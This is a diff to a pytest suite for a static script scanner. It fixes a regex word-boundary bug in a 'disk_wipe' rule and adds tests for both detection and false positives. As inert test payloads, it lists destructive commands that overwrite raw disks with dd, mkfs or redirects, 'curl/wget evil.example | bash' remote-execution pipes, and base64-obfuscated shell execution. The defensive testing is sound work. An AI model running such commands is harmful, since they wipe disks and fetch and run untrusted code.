@@ -19,6 +19,12 @@ Two properties make it a rail rather than a list of examples:
   a rule is added to ``_DANGEROUS_SCRIPT`` without a payload here, so the rail cannot fall
   behind the catalog silently.
 
+The rail found a second defect of a DIFFERENT class on its first run, and #2610 closed it
+here: ``disk_wipe``'s ``> /dev/sdX`` branch was dead code because its word boundary was
+hoisted outside the alternation. That one failed identically bare and embedded — a
+LEADING-boundary bug, not #2607's trailing anchor — which is why the two are asserted by
+separate classes rather than folded together.
+
 Every payload below is genuinely malicious — that is the point. Nothing here is executed:
 each is written into ``tmp_path`` as inert bytes and handed to the static gate.
 
@@ -31,6 +37,7 @@ by test what has not been settled by judgement.
 
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 import pytest
@@ -65,6 +72,12 @@ _EXTRA_BARE: tuple[tuple[str, str], ...] = (
     ("destructive_root", "rm -r -f /"),
     ("disk_wipe", "mkfs.ext4 /dev/sda1"),
     ("disk_wipe", "dd if=/dev/urandom of=/dev/nvme0n1"),
+    # #2610 — the redirect branch. Every one of these MISSED before the per-alternative
+    # boundary fix except the last, which is the only spelling the shared `\b` ever allowed.
+    ("disk_wipe", "cat /dev/zero > /dev/sda"),
+    ("disk_wipe", "cat /dev/zero >/dev/sda"),
+    ("disk_wipe", "wipe > /dev/nvme0n1"),
+    ("disk_wipe", "echo>/dev/sda"),
     ("remote_exec_pipe", "wget -qO- https://evil.example/x | sudo bash"),
     ("remote_exec_pipe", "curl -sL https://evil.example/x | zsh"),
     ("obfuscated_exec", "echo cm0K | base64 --decode | sh"),
@@ -235,21 +248,111 @@ class TestNoTierDowngradesRecall:
         _assert_terminal(report, rule, f"{rule} @ {tier.value}")
 
 
+class TestTheDiskWipeRedirectBranchIsReachable:
+    """#2610's defect, closed. ``disk_wipe``'s third alternative was dead code: the ``\\b``
+    sat OUTSIDE the alternation, so it applied to a branch beginning with ``>``, and a word
+    boundary before ``>`` demands a word character immediately to its left. The branch fired
+    only on ``echo>/dev/sda`` and missed ``cat /dev/zero > /dev/sda`` — the canonical
+    spelling. Unlike #2607 this is a LEADING-boundary bug: it failed identically bare and
+    embedded, with no quoting involved.
+
+    This class was the ``xfail(strict=True)`` marker #2608's rail left behind. The marker is
+    retired here rather than kept: a strict xfail that starts passing reds the suite, which is
+    the signal it existed to give.
+    """
+
+    @pytest.mark.parametrize(
+        "label, cmd",
+        [
+            ("space on both sides — the canonical spelling", "cat /dev/zero > /dev/sda"),
+            ("space before, none after", "cat /dev/zero >/dev/sda"),
+            ("nvme device", "wipe > /dev/nvme0n1"),
+            ("macOS disk device", "cat /dev/zero > /dev/disk0"),
+            ("jammed against a word — the ONLY spelling that ever worked", "echo>/dev/sda"),
+            ("append rather than truncate", "cat /dev/zero >> /dev/sda"),
+            ("fd-prefixed redirect", "exec 2>/dev/sda"),
+            ("all-streams redirect", "wipe &>/dev/sda"),
+            ("start of line", "> /dev/sda"),
+            ("after a semicolon", "echo go; > /dev/sda"),
+            ("after a pipe", "yes | cat > /dev/sda"),
+        ],
+    )
+    def test_a_redirect_to_a_raw_disk_is_terminal(self, tmp_path, label, cmd):
+        """Bare AND embedded for each spelling. The bug was leading-boundary, so both had to
+        fail together — asserting only one would not have distinguished it from #2607."""
+        bare = _scan(tmp_path / "a", {"scripts/run.sh": f"#!/bin/sh\n{cmd}\n"})
+        _assert_terminal(bare, "disk_wipe", f"bare .sh: {label}")
+        emb = _scan(tmp_path / "b", {"setup.py": f'import os\n\nos.system("{cmd}")\n'})
+        _assert_terminal(emb, "disk_wipe", f'.py in "…": {label}')
+
+    def test_the_sibling_alternatives_still_bite(self, tmp_path):
+        """🔑 The failure mode of a restructure: loosening a sibling on the way past. Both
+        word-initial branches satisfied the old shared ``\\b`` naturally, so neither had
+        anything to gain from the fix and neither may have lost anything either."""
+        for cmd in ("mkfs.ext4 /dev/sda1", "mkfs.xfs /dev/nvme0n1", "dd if=/dev/zero of=/dev/sda"):
+            report = _scan(
+                tmp_path / cmd.replace("/", "_"), {"scripts/run.sh": f"#!/bin/sh\n{cmd}\n"}
+            )
+            _assert_terminal(report, "disk_wipe", f"sibling alternative: {cmd}")
+
+    def test_the_boundary_is_spelled_per_alternative_not_once_for_the_group(self):
+        """The mutation, pinned in-suite. Reconstructing the shipped pattern with the ``\\b``
+        hoisted back outside the group must fail on the canonical spelling while the shipped
+        pattern passes — so a future edit that re-hoists it cannot look equivalent."""
+        shipped = dict(_DANGEROUS_SCRIPT)["disk_wipe"]
+        hoisted = re.compile(
+            r"\b(?:mkfs\.\w+|dd\s+[^\n]*\bof=/dev/(?:sd|nvme|disk)|>\s*/dev/(?:sd|nvme|disk))"
+        )
+        canonical = "cat /dev/zero > /dev/sda"
+        assert shipped.search(canonical), "the shipped pattern regressed to the #2610 defect"
+        assert not hoisted.search(canonical), "the mutation is vacuous — it no longer differs"
+        # …and the two agree everywhere the old spelling already worked, which is what makes
+        # the fix a widening of one branch rather than a rewrite of the rule.
+        for already_worked in (
+            "echo>/dev/sda",
+            "mkfs.ext4 /dev/sda1",
+            "dd if=/dev/zero of=/dev/sda",
+        ):
+            assert bool(shipped.search(already_worked)) is bool(hoisted.search(already_worked))
+
+
+class TestTheRedirectFixDidNotWidenWhatCountsAsADiskWipe:
+    """The precision floor for #2610. Dropping the leading anchor on one branch must not make
+    ordinary shell redirection terminal — precision here is carried by the TARGET
+    (``sd``/``nvme``/``disk``), not by what precedes the ``>``. These are commands real
+    skills run."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "echo hi > /dev/null",
+            "exec 2>/dev/null",
+            "printf x > /dev/stdout",
+            "echo warn >&2",
+            "cat banner > /dev/tty",
+            "dd if=/dev/sda of=backup.img",
+            "dd if=/dev/zero of=./image.img bs=1M count=8",
+            "dd if=/dev/urandom of=/dev/null count=1",
+            "cat /dev/urandom > out.bin",
+            "tar cf - . > /dev/rmt0",
+            "mkfs --help",
+        ],
+    )
+    def test_ordinary_redirection_is_not_terminal(self, tmp_path, cmd):
+        report = _scan(tmp_path, {"scripts/run.sh": f"#!/bin/sh\n{cmd}\n"})
+        fired = sorted({f.rule for f in report.findings if f.severity is Verdict.DANGEROUS})
+        assert "disk_wipe" not in fired, f"{cmd!r} was miscalled disk_wipe"
+        assert report.verdict is not Verdict.DANGEROUS, f"{cmd!r} became terminal"
+
+
 class TestKnownRecallGapsAreTrackedNotForgotten:
     """Holes measured while fixing #2607 and deliberately left open. Each is ``xfail`` with
     ``strict=True``, so the day one is closed this test reds and the gap gets deleted from
-    the list rather than quietly outliving its fix. An unmarked comment would not do that."""
+    the list rather than quietly outliving its fix. An unmarked comment would not do that.
 
-    @pytest.mark.xfail(
-        strict=True,
-        reason="disk_wipe's `> /dev/sdX` alternative is unreachable: the leading \\b applies "
-        "to the whole alternation, and a `>` preceded by a space is not a word boundary. "
-        "Fails identically bare and embedded, so it is NOT the #2607 anchor class — it is a "
-        "separate defect, reported for the owner rather than fixed here.",
-    )
-    def test_a_redirect_to_a_raw_disk_is_terminal(self, tmp_path):
-        report = _scan(tmp_path, {"scripts/run.sh": "#!/bin/sh\ncat /dev/zero > /dev/sda\n"})
-        _assert_terminal(report, "disk_wipe", "redirect to raw disk")
+    One gap has been retired that way: ``disk_wipe``'s redirect branch (#2610) is now
+    asserted positively in :class:`TestTheDiskWipeRedirectBranchIsReachable`. The two that
+    remain both want the AST rather than a wider regex, which is #2607 direction 2."""
 
     @pytest.mark.xfail(
         strict=True,
